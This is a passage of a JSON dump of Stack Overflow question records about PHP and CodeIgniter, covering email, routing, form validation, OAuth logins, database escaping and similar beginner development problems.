$this-&gt;email-&gt;smtp_port('25');\n    //requires TLS?????????????????????????????????????\n\n    $this-&gt;load-&gt;library('email');\n    $this-&gt;email-&gt;set_newline(\"\\r\\n\");\n\n    $this-&gt;email-&gt;from('jonathan@abc.com', 'Abc');\n    $this-&gt;email-&gt;to('admin@abc.com');\n    $this-&gt;email-&gt;subject('This is an email test');\n    $this-&gt;email-&gt;message('It is working. Great!');\n\n    //$file =  './attachments/Info.txt';\n\n    //$this-&gt;email-&gt;attach($file);\n\n    if($this-&gt;email-&gt;send())\n    {\n        echo 'Your email was sent, successfully.';\n    }\n\n    else\n    {\n        show_error($this-&gt;email-&gt;print_debugger());\n    }\n</code></pre>\n\n<p>View</p>\n\n<pre><code>&lt;form method=\"POST\" name=\"email_form_with_php\"\naction=\"#\" enctype=\"multipart/form-data\"&gt;\n&lt;label for='name'&gt;Name: &lt;/label&gt;\n&lt;input type=\"text\" name=\"name\" &gt;\n&lt;label for='email'&gt;Email: &lt;/label&gt;\n&lt;input type=\"text\" name=\"email\" &gt;\n&lt;label for='message'&gt;Message:&lt;/label&gt;\n&lt;textarea name=\"message\"&gt;&lt;/textarea&gt;\n&lt;label for='uploaded_file'&gt;Select A File To Upload:&lt;/label&gt;\n&lt;input type=\"file\" name=\"uploaded_file\"&gt;\n&lt;input type=\"submit\" value=\"Submit\" name='sendresume'&gt;\n&lt;/form&gt;\n</code></pre>\n"},{"tags":["php","codeigniter","codeigniter-routing"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":13057071,"title":"Handling Sub-Sections of a Site—Codeigniter","body":"<p>I'm fairly new to Codeigniter as well as MVC and I'm having a bit of trouble figuring out the best way to accomplish this.</p>\n\n<p>I need to build an app that allows users to apply to various programs offered by some institutions. However, these institutions must all have a spot in the app yet they want their independence from one another—not sharing one application page for all programs. For instance Institution 1 wants a section of the site to only view and apply to their programs and Institution 2 wants a section of the site to only apply to their programs.</p>\n\n<p>What is the best way to accomplish this? Should I create a separate controller for each institution? </p>\n\n<p>E.g. <code>sitename.com/inst1/apply, sitename.com/inst2/apply</code> </p>\n\n<p>Each of these controllers would essentially be identical with the same create/read/update/etc functions though. What are best practices in this situation? Thank you!</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":477,"score":1,"question_id":4202208,"title":"How to validate many fields combined in Codeigniter?","body":"<p>Is there a creative and easy way to check many form fields at once.</p>\n\n<p>I have a form with generated fields on the fly, each has a unique id. </p>\n\n<p>The thing is submitting all the fields are not required, but at least one field must be filled before submitting.</p>\n\n<p>Is there a way to do this in Codeigniter, or how would I go about validating this effectively. </p>\n\n<p>I understand that it is possible to check each field individually, but I'm seeking for a much cleaner way.</p>\n\n<p>I hope it's clear for you guys. Thanks.</p>\n"},{"tags":["php","codeigniter","php-frameworks"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":6095,"score":2,"question_id":6118740,"title":"Codeigniter - no input file specified","body":"<p>Hi I am a beginner in Codeigniter and I saw a CI tutorial and was just trying to do a simple thing. I downloaded the CI and added this file to controller directory, but it won't work.</p>\n\n<pre><code>&lt;?php\n\nclass site extends CI_Controller\n{\n\n        public function index()\n        {\n                echo \"Hello World\";\n        }\n\n        function dosomething()\n        {\n                echo \"Do Something\";\n        }\n\n}\n\n?&gt;\n</code></pre>\n\n<p>When I try to access it using <a href=\"http://..../index.php/site\" rel=\"nofollow\">http://..../index.php/site</a> I get the output ... \"no input file specified\" .... by the way, I named the file site.php</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13054050,"title":"Codeigniter form validation set message","body":"<p>A quick one guys, I have the same (ish) form validation rule for the username and email input fields respectively, and i need to set the message of the rules individually. How do i do that?</p>\n\n<pre><code>**CODE**\n\n$this-&gt;form_validation-&gt;set_rules('username','Username', 'trim|required|xss_clean|min_length[2]|is_unique[users.username]');\n$this-&gt;form_validation-&gt;set_rules('email','Email', 'trim|required|valid_email|xss_clean|is_unique[users.email]');\n</code></pre>\n\n<p>I'm trying to override the message for \"is_unique\" here,</p>\n\n<pre><code>$this-&gt;form_validation-&gt;set_message('is_unique','Username taken');\n</code></pre>\n\n<p>how do i set the message for email as well?</p>\n"},{"tags":["php","codeigniter","controller"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13060538,"title":"Codeigniter Undefined Variable on status","body":"<p>i have login form like this</p>\n\n<p><img src=\"http://i.stack.imgur.com/xKeFS.png\" alt=\"enter image description here\"></p>\n\n<p>log in to the application, it shows menu like this\n<img src=\"http://i.stack.imgur.com/osvX6.png\" alt=\"enter image description here\"></p>\n\n<p>it went fine until i click some menu, then it shows\n<img src=\"http://i.stack.imgur.com/Pz0sd.png\" alt=\"enter image description here\"></p>\n\n<p>here is the controller of the link that i clicked\ni thought <code>keuangan</code> was already on the menu, but why does the <code>keuangan</code> not appear when i click some link of the menu ? </p>\n\n<pre><code> function index()\n{\n    $data['title'] = 'QB Cash Advance Settlement';\n    $this-&gt;load-&gt;view('menu',$data);\n    $this-&gt;load-&gt;view('v/vcas');\n}\n</code></pre>\n\n<p>here is the <code>c_menu</code> controller</p>\n\n<pre><code>function index()\n{\n    $data['title'] = \"QB Dashboard\";\n    $data['jabatan'] = \"Keuangan\";\n    $this-&gt;load-&gt;view('menu',$data);\n    $this-&gt;load-&gt;view('body');\n}\n</code></pre>\n\n<p>here is the menu_view</p>\n\n<pre><code>&lt;div id =\"user\"&gt;Selamat datang, &lt;?php echo $jabatan; ?&gt;&lt;/div&gt;\n</code></pre>\n\n<p>the login controller</p>\n\n<pre><code>function login()\n{   \n    $username = $this-&gt;input-&gt;post('username');\n    $jabatan = $this-&gt;input-&gt;post('jabatan');\n    $this-&gt;form_validation-&gt;set_rules('username','Username','alpha_numeric|trim|required|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('password', 'Password', 'trim|required|xss_clean|callback_check_database');\n\n     if($this-&gt;form_validation-&gt;run() == FALSE)\n     {\n         $this-&gt;load-&gt;view('login');\n }\n  else\n {\n\n         if($jabatan == 'keuangan')\n         {\n                 redirect('c_menu','refresh');\n         }\n         else if ($jabatan == 'hd')\n         {\n             echo $jabatan;\n         }\n         else\n         {\n             echo $jabatan;\n         }\n }\n</code></pre>\n\n<p>do i need to declare <code>$data['title'] = 'keuangan'</code> in every controller/index ? </p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13060384,"title":"php/codeigniter - using while to link two functions","body":"<p>I've got some follow/unfollow and block/unblock functions in my app. They work fine and the correct data is populating my database. Here's an outline of my logic:</p>\n\n<pre><code>if($this-&gt;user_is_followed) {\n    //show unfollow button\n}else {     \n    //show follow button\n\n}\n\nif($this-&gt;user_is_blocked) {    \n    //show unblock button\n}else {\n    //show block button\n}\n</code></pre>\n\n<p>One issue: I need to link the follow/unfollow and block/unblock functions for these 2 scenarios:</p>\n\n<p>1 - If a user is following someone, and clicks the block button, that user should be blocked and unfollowed (right now, the user is blocked, but not unfollowed)</p>\n\n<p>2 - If a user is blocking someone, and clicks the follow button, that user should be followed and unblocked (right now, the user is followed, but not unblocked)</p>\n\n<p>I tried using -while- to link the 2 functions, but nothing shows up, not even errors, just a blank screen:</p>\n\n<p>Here's my attempt at the while logic:</p>\n\n<pre><code>    if($this-&gt;user_is_followed) {\n        while($this-&gt;user_is_blocked) {\n            //show unfollow button\n        }\n    }       \n    else if($this-&gt;user_is_blocked) {\n        while($this-&gt;user_is_followed) {        \n        //show follow button \n        }       \n    }\n</code></pre>\n\n<p>Simply put, I'm trying to figure out which php control structure I can use for this. Is it -while- or something else?</p>\n"},{"tags":["php","mysql","codeigniter","laravel","multitenancy"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":88,"score":1,"question_id":13059168,"title":"How to build a multi tenant app but only share certain tables?","body":"<p>I'm wanting to build a vehicle management system.\nI'm not new to PHP but I am new to Multi-tenancy.</p>\n\n<p>I've decided to build this system just as a learning tool. I've got other projects in the future that I want to build using similar structures but this system is simple and straight forward so it seemed like a good one to play with.</p>\n\n<p>I want to share some tables to all tenants e.g. vehicle list/makes/models but other tables like \"fuel entries\" shouldn't be shared.\nThe reason behind not sharing is the ability to easy access that tenants data without messing with others.\nNote: the shared database will be updated regularly.</p>\n\n<hr>\n\n<p>What are some starting points in order to implement this?</p>\n\n<hr>\n\n<p>I'm using PHP/MySQL and will definitely be using a framework.</p>\n\n<p>I've searched the web for examples but most of them arn't php/mysql or if they are they are extremely vague...</p>\n"},{"tags":["api","codeigniter","twitter-api","twitter-oauth"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13056814,"title":"Elliot Haughin Twitter Codeigniter API User access token and access secret issues","body":"<p>I am using Haughin's Twitter Codeigniter API to Login with twitter. Now i need to be able to post tweets on User's behalf. The problem is, I first need to find and get the user's access token and user's secret and store them in my database for later use. Where do I find those once I made the connection to twitter?</p>\n\n<p>Thanks.</p>\n"},{"tags":["php","class","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":13056196,"title":"How can i get a variable that was definied in class and use the it somewhere else","body":"<p>i am using codeignighter.</p>\n\n<p>I have a class that has some variables i need to use somewhere else.</p>\n\n<p>for example:</p>\n\n<pre><code> class details{\n\npublic $username;\npublic $current_uID;\npublic $member_status;\n\n    public function __construct(){\n         $this-&gt;username = 'username';\n         $this-&gt;current_uID = 21;\n         $this-&gt;member_status = 1;\n    }\n}\n</code></pre>\n\n<p>Now my question is how do i access the those variable - and if i do will they have the values that was defined in the construct ?</p>\n\n<p>Thanks in advanced</p>\n"},{"tags":["php","javascript","jquery","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":13053038,"title":"Jquery, Codeigniter 2.1 - How to check if update is succesfull","body":"<p>How can I see if the update, after JQuery post, is succesfull?</p>\n\n<p>JQuery code:</p>\n\n<pre><code>var code = $('#code'),\n     id = $('input[name=id]').val(),\n     url = '&lt;?php echo base_url() ?&gt;mali_oglasi/mgl_check_paid';\n     code.on('focusout', function(){\n        var code_value = $(this).val();\n        if(code_value.length &lt; 16 ) {\n            code.after('&lt;p&gt;Code is short&lt;/p&gt;');\n        } else {\n            $.post(url, {id : id, code : code_value}, function(){\n        });\n        }\n     });  \n</code></pre>\n\n<p>CI controller:</p>\n\n<pre><code>function mgl_check_paid()\n    {\n        $code = $this-&gt;input-&gt;post('code');\n        $id = $this-&gt;input-&gt;post('id');\n        $this-&gt;mgl-&gt;mgl_check_paid($code, $id);\n    }\n</code></pre>\n\n<p>CI model:</p>\n\n<pre><code>function mgl_check_paid($code, $id){\n        $q = $this-&gt;db-&gt;select('*')-&gt;from('ad')-&gt;where('id_ad', $id)-&gt;where('code', $code)-&gt;get();\n            $q_r = $q-&gt;row();\n            if ($q-&gt;num_rows() != 0 &amp;&amp; $q_r-&gt;paid == 0) :\n                $data['paid'] = 1;\n                $this-&gt;db-&gt;where('id_ad', $id);\n                $this-&gt;db-&gt;update('ad', $data);\n                return TRUE;\n            else :\n                return FALSE;\n            endif;\n    }\n</code></pre>\n\n<p>I need to check if update is successful and show appropriate message.</p>\n"},{"tags":["php","codeigniter","partial-views","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":96,"score":0,"question_id":13045226,"title":"CodeIgniter load controller within a controller","body":"<p>I'm using <a href=\"http://github.com/philsturgeon/codeigniter-template/\" rel=\"nofollow\">http://github.com/philsturgeon/codeigniter-template/</a> for the templates\nand I trying to load other controller view to actual view as a partial.\nMy main problem is that I cant append meta data (javascripts, css) from other controller to the main controller.</p>\n\n<p><strong>application/core/MY_Loader.php</strong>\n    \n\n<pre><code>class MY_Loader extends CI_Loader\n{\n    function __construct()\n    {\n        parent::__construct();\n    }\n\n    function controller( $sController ) {\n        global $RTR;\n\n        // Parse the sController string ex: demo/index\n        $aControllerData = explode( '/', $sController );\n\n        $sMethod = !empty( $aControllerData[1] )\n            ? $aControllerData[1]\n            : 'index'\n        ;\n        $sController = !empty( $aControllerData[0] )\n            ? $aControllerData[0]\n            : $RTR-&gt;default_controller\n        ;\n\n        $sClass = ucfirst( $sController );\n\n        $sPath = APPPATH . 'controllers/';\n\n        if ( !file_exists( $sPath . $sController . '.php' ) || class_exists( $sClass, FALSE ) ) {\n\n            set_status_header( 503 );\n            exit( 'Unable to locate the specified class: '. ucfirst( $sController ).'.php' );\n        }\n        $this-&gt;file( $sPath . $sController . '.php' );\n        $sClass = new $sClass;\n\n        if ( !method_exists( $sClass, $sMethod ) ) {\n            set_status_header( 503 );\n            exit( 'There is no Method: ' . $sMethod . ' in Class: '. ucfirst( $sController ).'.php' );\n        }\n        $aArguments = func_get_args();\n        return call_user_func_array( array( $sClass, $sMethod ), array_slice( $aArguments, 1));\n    }\n\n}\n\n\n/* End of file MY_Loader.php */\n/* Location: ./controllers/MY_Loader.php */\n</code></pre>\n\n<p><strong>application/controllers/demo.php</strong></p>\n\n<pre><code>&lt;?php if ( !defined( 'BASEPATH' ) ) {\n    exit( 'No direct script access allowed' );\n}\n\nclass Demo extends CI_Controller\n{\n\n    function index() {\n\n        $this-&gt;load-&gt;controller('welcome');\n        $this-&gt;template-&gt;set_partial('footer', 'partials/footer')-&gt;build('demo');\n    }\n}\n\n/* End of file welcome.php */\n/* Location: ./controllers/demo.php */\n</code></pre>\n\n<p><strong>application/controllers/welcome.php</strong></p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\nclass Welcome extends CI_Controller {\n\n    public function index()\n    {\n        echo 'Loaded welcome controller';\n        $this-&gt;template-&gt;title('Welcome');\n        $this-&gt;template-&gt;append_metadata('&lt;script src=\"/js/jquery.js\"&gt;&lt;/script&gt;');\n        $this-&gt;template-&gt;set_partial('footer', 'partials/footer')-&gt;build('welcome_message');\n    }\n}\n</code></pre>\n\n<p>After going to the url localhost/demo i got interface with partials and everything looks good, but I see that there are some libraries loaded too many times in my logs.</p>\n\n<pre><code>DEBUG - 2012-10-24 08:02:16 --&gt; Database Driver Class Initialized\nDEBUG - 2012-10-24 08:02:16 --&gt; User Agent Class Initialized\nDEBUG - 2012-10-24 08:02:16 --&gt; Template Class Initialized\nDEBUG - 2012-10-24 08:02:16 --&gt; Controller Class Initialized\nDEBUG - 2012-10-24 08:02:16 --&gt; File loaded: /home/www/application/controllers/welcome.php\nDEBUG - 2012-10-24 08:02:16 --&gt; Database Driver Class Initialized\nDEBUG - 2012-10-24 08:02:16 --&gt; User Agent Class Initialized\nDEBUG - 2012-10-24 08:02:16 --&gt; Template Class Initialized\nDEBUG - 2012-10-24 08:02:16 --&gt; Controller Class Initialized\nDEBUG - 2012-10-24 08:02:16 --&gt; File loaded: /home/www/application/themes/default/views/partials/footer.php\nDEBUG - 2012-10-24 08:02:16 --&gt; File loaded: /home/www/application/views/welcome_message.php\nDEBUG - 2012-10-24 08:02:16 --&gt; File loaded: /home/www/application/themes/default/views/layouts/main.php\nDEBUG - 2012-10-24 08:02:16 --&gt; Helper loaded: inflector_helper\nDEBUG - 2012-10-24 08:02:16 --&gt; File loaded: /home/www/application/themes/default/views/partials/footer.php\nDEBUG - 2012-10-24 08:02:16 --&gt; File loaded: /home/www/application/views/demo.php\nDEBUG - 2012-10-24 08:02:16 --&gt; File loaded: /home/www/application/themes/default/views/layouts/main.php\nDEBUG - 2012-10-24 08:02:16 --&gt; Final output sent to browser\n</code></pre>\n\n<p>I was trying to use HMVC but there was the same result.</p>\n"},{"tags":["facebook","codeigniter","authentication"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":1,"view_count":49,"score":-1,"question_id":13054990,"title":"How can i do the user redirect automatically to oauth dialog when enter to canvas url?","body":"<p>Regards,</p>\n\n<p>Back, when \"Authenticated Referrals\" not depreciated, if the user entered to my facebook application through the canvas url, was redirected to dialogue authorization (for permissions).</p>\n\n<p>Now that do not exist the option, I must do it manually so you can redirect url through the canvas.</p>\n\n<p>I am using Codeigniter for it and from what I see, facebook cancel any redirection I do.</p>\n\n<p>Here is my code:</p>\n\n<pre><code>try {\n            $fb_id = $this-&gt;facebook-&gt;getUser();\n            if ($fb_id) {\n                $fb_data = $this-&gt;facebook-&gt;api('/me');\n                return $fb_data;\n            } else {\n                echo 'You don't give me the permissions';\n                $url = $url = $this-&gt;facebook-&gt;getLoginUrl(array(\n                    'scope' =&gt; 'email,user_likes,user_about_me,publish_stream,user_birthday',\n                    'redirect_uri' =&gt; $this-&gt;config-&gt;item('app_name')\n                        ));\n                header(\"location:$url\");\n                redirect($url, 'refresh');\n            }\n        } catch (Exception $exc) {\n            echo $exc;\n        }\n</code></pre>\n\n<p>Is there a simpler way to do it? Any examples you can show me? Thanks in advance</p>\n\n<p>NOTE: My application is a (for now) recorder audio for users\nFirst is a registration with personal information.\nThen show the recorder audio.</p>\n\n<p>My target is when a new user find my application (apps.facebook.com/my_app), enter to my app and show automatically the oauth dialog for permission (as before). Then enter to the registration view.</p>\n"},{"tags":["php","frameworks","codeigniter"],"answer_count":7,"favorite_count":37,"up_vote_count":31,"down_vote_count":0,"view_count":2494,"score":31,"question_id":3655145,"title":"Going from a framework to no-framework","body":"<p>I've been developing in PHP for about 8 years as a hobby. In 2009, I picked up codeigniter and since then I've not managed to get a single project developed.</p>\n\n<p>I find it slows me down trying to work out how to modify it to work the way I want, when if I was working in pure PHP, I'd know, or I'd be able to quickly find a snippet for.</p>\n\n<p>I've tried CodeIgniter, Kohana and Symfony. I love the ease of use (and I've also started using doctrine as an ORM which massively sped up my database work), but I find projects are taking me 3-4 times the amount of time it took in pure PHP. I get bored and frustrated when I can't find a solution to a problem I've previously solved in pure PHP.</p>\n\n<p>Has anyone gone back from using frameworks to a no-framework approach. Is there anything like a basic security framework (prevent XSS, filter posted data, provide a cleaning function for use with databases)? I think something like that would benefit me much more than a full scale framework. I think learning to work with frameworks has taught me a lot, but I'd be happier working with my own code.</p>\n"},{"tags":["php","sql-server","codeigniter","odbc"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":68,"score":0,"question_id":13054094,"title":"Codeigniter not escaping single quotes in ODBC-mssql using ActiveRecord","body":"<p>I have a form with a bunch of fields. Sometimes users provides information and descriptions with single quotes in it.</p>\n\n<p>I'm validating the data with Jquery and CI, the problem is that apparently ActiveRecord isn't escaping single quotes, leading to an error inserting/updating data.</p>\n\n<p>Isn't ActiveRecord supposed to escape these characters automatically?  If it doesn't, what is the usual way for handing single quotes in user input?</p>\n\n<p>Example code of my model function that handles the insert:</p>\n\n<pre><code>public function setLicense($dataArray, $data_id=\"\")\n{\n    $iRows  = 0; // Rows found.\n    $DB = $this-&gt;load-&gt;database('some_database',TRUE,TRUE);\n\n    //var_dump($dataArray);\n    if(empty($dataArray))\n        return(FALSE);\n\n    if(!empty($data_id))\n    {\n        $DB-&gt;where('idx',$data_id);\n        $iRows=$DB-&gt;count_all_results('some_table');\n    }\n    else\n    {\n        if(isset($LicenseData['idx']))\n        {\n            $license = $LicenseData['idx'];\n            $DB-&gt;where('idx',$license);\n            $iRows=$DB-&gt;count_all_results('some_table');\n        }\n    }\n    if(!$iRows)\n        $DB-&gt;insert('some_table',$dataArray);\n    else\n    {   \n        $DB-&gt;where('idx',$data_id);\n        $DB-&gt;update('some_table',$dataArray);\n    }\n    return(TRUE);\n}\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":13052085,"title":"CodeIgniter - Access database within a Helper","body":"<p>I have this code inside my view.</p>\n\n<pre><code>$country = array(\n    'id' =&gt; 'country',\n    'name' =&gt; 'country',\n    'value' =&gt; get_user_info('country'),\n    'size' =&gt; 30\n);\n\n&lt;tr&gt;\n            &lt;td&gt;&lt;?php echo form_label('Country', $country['id']); ?&gt;&lt;/td&gt;\n            &lt;td&gt;&lt;?php echo form_input($country); ?&gt;&lt;/td&gt;\n            &lt;td style=\"color: red;\"&gt;&lt;?php echo form_error($country['name']); ?&gt;&lt;?php echo isset($errors[$country['name']])?$errors[$country['name']]:''; ?&gt;&lt;/td&gt;\n    &lt;/tr&gt;\n</code></pre>\n\n<p>The get_user_info() is a function defined in my form_helper like this:<br />\n<strong>Form_Helper.php</strong></p>\n\n<pre><code>if(! function_exists('get_user_info')){\n\n        function get_user_info($field)\n        {\n            $ci = &amp; get_instance();\n            $ci-&gt;load-&gt;model('users');\n            return $ci-&gt;users-&gt;get_user_profile($field);\n        }\n}\n</code></pre>\n\n<p>As you can see , inside this function I access the database through the users Model.\nUser_Model</p>\n\n<pre><code>function get_user_profile($field)\n        {\n            $user_id = $this-&gt;session-&gt;userdata('user_id');\n\n            $this-&gt;db-&gt;select($field);\n            $this-&gt;db-&gt;where('user_id',$user_id);\n\n            $query = $this-&gt;db-&gt;get($this-&gt;profile_table_name);\n            if($query-&gt;num_rows()==1)return $query-&gt;row();\n\n            return NULL;\n        }\n</code></pre>\n\n<p>The idea is to auto fill the Country field of the form while the page loads.<br>\nBut in the view I am getting this error<br /></p>\n\n<pre><code>A PHP Error was encountered\n\nSeverity: Warning\n\nMessage: htmlspecialchars() expects parameter 1 to be string, object given\n\nFilename: helpers/form_helper.php\n\nLine Number: 646\n</code></pre>\n\n<p>What can be the problem ?<br />Can someone knows what is happening ? Or has someone did a such a thing in the past ?\n<br />\nIs it the right way to access the Model within a helper function ?<br /></p>\n\n<p>Thanks</p>\n\n<p><strong>EDIT</strong><br />\nTo do better and faster I simply call the model from my controller and then pass the different values to the view.<br />\n<em>Controller</em><br /></p>\n\n<pre><code>$d = $this-&gt;users-&gt;get_user_profile('country, telephone, city, street, address, town');\n        $d2 = Array(\n            'telephone' =&gt; $d-&gt;telephone,\n            'country' =&gt; $d-&gt;country,\n            'city' =&gt; $d-&gt;city,\n            'street' =&gt; $d-&gt;street,\n            'address' =&gt;$d-&gt;address,\n            'town' =&gt; $d-&gt;town);\n        $this-&gt;template-&gt;write_view('contentw','dashboard/profile', $d2);\n        $this-&gt;template-&gt;render();\n</code></pre>\n\n<p>So I delete the function I added to my Helper file. <br /></p>\n\n<p>This method is working for me.<br />\nThank you all for your answers</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":13049431,"title":"Codeigniter form validation callback not working","body":"<p>I'm trying to extend the validation class with my own function but it seems to skip the check.</p>\n\n<p><strong>My code</strong></p>\n\n<pre><code>public function login_validation(){\n $this-&gt;load-&gt;library('form_validation');\n $this-&gt;form_validation-&gt;set_rules('email', 'Email', 'trim|required|valid_email|xss_clean|callback_validate_credentails');\n $this-&gt;form_validation-&gt;set_rules('password', 'Password', 'trim|required|md5');\n    if($this-&gt;form_validation-&gt;run()){\n        #redirect('home');\n        //Just to check \n        echo \"login success\";\n    }\n    else{\n        $this-&gt;load-&gt;view('view_login');\n    }\n}\n</code></pre>\n\n<p>My validate credentails function goes like this;</p>\n\n<pre><code>public function validate_credentials(){\n   //loads model_user\n   $this-&gt;load-&gt;model('model_users');\n   //checks if login_validate function in model_users return true\n    if($this-&gt;model_users-&gt;login_validate()){\n        return true;\n    }\n    else{\n        //set validation message\n        $this-&gt;form_validation-&gt;set_message('validate_credentails','Incorrect Username/Password');\n        return false;\n    }\n\n}\n</code></pre>\n\n<p>My login_validate function in model_users if needed;</p>\n\n<pre><code>public function login_validate(){\n    $this-&gt;db-&gt;where('email', $this-&gt;input-&gt;post('email'));\n    $this-&gt;db-&gt;where('password', md5($this-&gt;input-&gt;post('password')));\n    $query = $this-&gt;db-&gt;get('users');\n    if($query-&gt;num_rows() == 1){\n        return true;\n    }\n    else {\n        return false; \n        }\n\n}\n</code></pre>\n\n<p>This is the first time i've had this problem, am i doing something wrong? I've spent too much time on this :( </p>\n"},{"tags":["php","codeigniter","codeigniter-url","codeigniter-routing"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":45,"score":-1,"question_id":13048026,"title":"How can I pass a direct link to download some file from the browser in a Code Igniter based website? Like this: www.example.com/examplemovie.mov","body":"<p>I need to allow a link like this <code>www.example.com/example.mov</code> to be accessed or downloaded via browser in a code igniter application. Right now i received a \"Page not found\" message. The file is in the root directory, but i think there is some config in Code Igniter not allowing this behavior.</p>\n"}]}
{"total":13987,"page":6,"pagesize":100,"questions":[{"tags":["php","javascript","ajax","codeigniter","drop-down-menu"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":2496,"score":0,"question_id":3105825,"title":"Populate a second DropDownList based on a selected value fron other DropDownList","body":"<p>I’m trying to link two dropdownlist depending on the value you select from the first dropdownlist.\nI don’t have any idea how to do this, so if you guys can point me in the right direction that would be great.</p>\n\n<p>What I want to do is select a value from the first dropdownlist and depending on its value show some options in the second dropdownlist.</p>\n\n<p>I try doing this:</p>\n\n<p>1-when the “OnChange” event of the first dropdownlist occurs, I call a javascript that redirects to a method in a controller (for example: index/mainController/firstMethod/selectedValue).</p>\n\n<p>2-the method in the controller using the url helper extracts the “selectedValue” to do a database search of the value of the second dropdownlist.</p>\n\n<p>3-the same method loads the view (the one that have the ddl)</p>\n\n<p>Doing this I lose the selected value of the first ddl.</p>\n\n<p>I think this is not the right way to do it.</p>\n\n<p>So, once again, I need some help.</p>\n\n<p>Thanks for your time.</p>\n"},{"tags":["php",".htaccess","codeigniter","redirect","expressionengine"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":235,"score":0,"question_id":11759543,"title":"php / expression engine - redirect all URLs from one URL segment to another URL segment","body":"<p>I have an expression engine site that I recently redid and, while the titles of each article or page on the site did not change, the routes to them did. So, for example, where before I had:</p>\n\n<p>site.com/site/code_single/name-of-page</p>\n\n<p>I now have</p>\n\n<p>site.com/main/code-item/name-of-page</p>\n\n<p>How would I set up a redirect (either with expression engine tags or with PHP / .htaccess) so that all URLS matching site/code_single got redirected to their corresponding titles in site/main/code-item?</p>\n"},{"tags":["php","codeigniter","pdf-generation"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":1,"view_count":1254,"score":1,"question_id":10580092,"title":"Suitable library to write PDF using Code igniter","body":"<p>Which library is best to write PDF from HTML using Code Igniter? </p>\n\n<p>Right now I'm using TCPDF, and it's taking much time to load a library.</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":281,"score":1,"question_id":9878022,"title":"CodeIgniter Load File with variables","body":"<p>Ok I have a file that I am loading that is being used for generating an email.</p>\n\n<p>Is there a way to pass it variables, and to populate the file with the values of the variables, and THEN plug it into the message body to send?</p>\n\n<p>Here is simple controller code:</p>\n\n<pre><code>$var = 'test';    \n$ci-&gt;load-&gt;file('Test/view/dialog.php',true);\n</code></pre>\n\n<p>HTML file:</p>\n\n<pre><code>&lt;strong&gt;&lt;?php echo $var; ?&gt;&lt;/strong&gt;\n</code></pre>\n\n<p>Note that dialog.php file is in root directory in \"Test\" dir, so I can't use $this->load->view(); </p>\n\n<p>I looked in Loader.php and It seems that file() method can't do that. Maybe there is any other solutions to do this?</p>\n\n<p>Sorry for bad English language</p>\n"},{"tags":["codeigniter","parsing","pyrocms","pyrocms-lex"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":35,"score":-3,"question_id":13043840,"title":"PyroCMS Lex parser issue on Server only","body":"<p>Lex Parser Issue:</p>\n\n<p>We're having issue with the lex parser. It fails to parse data we're trying to call through </p>\n\n<p>our tags; however, the parser fails to read/parse and thus display the data. We confront </p>\n\n<p>the issue while we try to parse on server. It works fine locally though. </p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1554,"score":1,"question_id":9071838,"title":"Force reload/refresh when pressing the back button","body":"<p>I will try my best to explain this. </p>\n\n<p>I have an application that show the 50+ projects in my <code>view</code> page. The user can click the individual project and go to the <code>update</code> page to update the project information. Everything works fine except that after user finish updating the individual project information and hit 'back' button on the browser to the previous <code>view page</code>. The old project information (before update) is still there. The user has to hit refresh to see the updated information. It not that bad, but I wish to provide better user experience. Any idea to fix this? Thanks a lot.</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13048772,"title":"unable to load Assetes class with MY_Assetes in same directory","body":"<p>i have one third party asset library in my application folder, i am extending that library with MY_Assets library both are in same application/library directory, but when loading its giving error Unable to load the requested class: Assets, i want to add some extra features in library by extending it so if developer of main library make any update nothing effect to mine extension </p>\n"},{"tags":["php","codeigniter","craigslist"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":1,"view_count":2208,"score":1,"question_id":1785386,"title":"CraigsList Auto-posting","body":"<p>I have searched high and low and have not been able to find a definite answer to this question.</p>\n\n<p>Does anyone know how developers auto-post to CraigsList using PHP (or CodeIgniter)?</p>\n"},{"tags":["php","codeigniter","form-validation"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":13034020,"title":"Form_validation - How to show specific error in error_list","body":"<p>I'm currently trying to find a way to only display specific errors of an error 